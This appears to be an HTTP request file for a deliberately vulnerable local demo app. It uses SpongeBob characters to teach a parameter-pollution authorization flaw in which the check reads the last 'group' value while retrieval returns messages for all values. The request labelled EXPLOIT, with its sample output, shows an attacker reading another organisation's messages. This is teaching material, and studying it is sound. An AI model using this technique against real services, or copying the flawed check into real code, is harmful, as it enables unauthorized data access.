@base = http://localhost:8000/ii/multi-value-semantics

### Expected usage: Mr. Krabs accesses multiple groups he administers
POST {{base}}/example3
Content-Type: application/x-www-form-urlencoded

user=mr.krabs@krusty-krab.sea&password=$$$money$$$&group=staff@krusty-krab.sea&group=managers@krusty-krab.sea

# Results in 200 OK - Mr. Krabs sees combined messages:
#
# [
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
#   },
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "The secret formula is stored in the safe. Combination: rotate right 3 times to 12, left 2 times to 7, right once to 23."
#   }
# ]

###

### Plankton can access his own group's messages
POST {{base}}/example3
Content-Type: application/x-www-form-urlencoded

user=plankton@chum-bucket.sea&password=burgers-are-yummy&group=staff@chum-bucket.sea

# Results in 200 OK:
#
# [
#   {
#     "from": "plankton@chum-bucket.sea",
#     "message": "To my future self, don't forget to steal the formula!"
#   }
# ]

###

### EXPLOIT: Plankton exploits last-value authorization against all-values retrieval
POST {{base}}/example3
Content-Type: application/x-www-form-urlencoded

user=plankton@chum-bucket.sea&password=burgers-are-yummy&group=staff@chum-bucket.sea&group=staff@krusty-krab.sea&group=managers@krusty-krab.sea

# Results in sensitive data disclosure:
#
# [
#   {
#     "from": "plankton@chum-bucket.sea",
#     "message": "To my future self, don't forget to steal the formula!"
#   },
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
#   },
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "The secret formula is stored in the safe. Combination: rotate right 3 times to 12, left 2 times to 7, right once to 23."
#   }
# ]
#
# IMPACT: Plankton steals the complete secret formula heist plan - safe password,
# location, AND combination! This variant is even more subtle than example 2:
# the authorization check uses the LAST group value (managers@krusty-krab.sea),
# sees it fails, but the message retrieval still processes ALL values. The
# last/all semantic mismatch combined with failed authorization still allowing
# data access demonstrates how multi-value semantics create complex attack surfaces.
